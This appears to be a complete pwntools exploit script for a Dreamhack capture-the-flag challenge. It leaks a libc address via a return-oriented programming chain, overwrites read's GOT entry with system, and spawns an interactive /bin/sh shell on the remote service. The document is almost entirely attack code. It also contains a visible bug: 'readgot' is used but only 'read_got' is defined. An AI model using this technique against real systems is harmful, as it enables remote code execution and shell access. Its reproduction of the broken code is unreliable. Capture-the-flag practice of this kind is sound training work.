from pwn import *

p = remote("host3.dreamhack.games", 11458)
libc = ELF('./libc.so.6')

puts_plt = 0x4005c0
read_plt = 0x4005f0
read_got = 0x601030
prdi_ret_gadget = 0x400883
prsi_r15_ret_gadget = 0x400881

# puts(read_got)
payload = b'\x90' * 64
payload += b'\x90' * 8
payload += p64(prdi_ret_gadget)
payload += p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x40)
payload += p64(prdi_ret_gadget)
payload += p64(0)
payload += p64(prsi_r15_ret_gadget)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

# call read("/bin/sh")
payload += p64(prdi_ret_gadget)
payload += p64(readgot + 0x8)
payload += p64(read_plt)

p.sendline(payload)
p.recvn(64)                                          # write(1, buf, sizeof(buf))만큼 출력하므로 그 이후로부터 8 byte 받음
read_addr = u64(p.recvn(6) + b'\x00'*2)
print("read addr =", hex(read_addr))

libc_base = read_addr - libc.symbols['read']
system = libc_base + libc.symbols['system']
print("system addr =", hex(system))

p.send(p64(system) + b'/bin/sh\x00')
p.interactive()
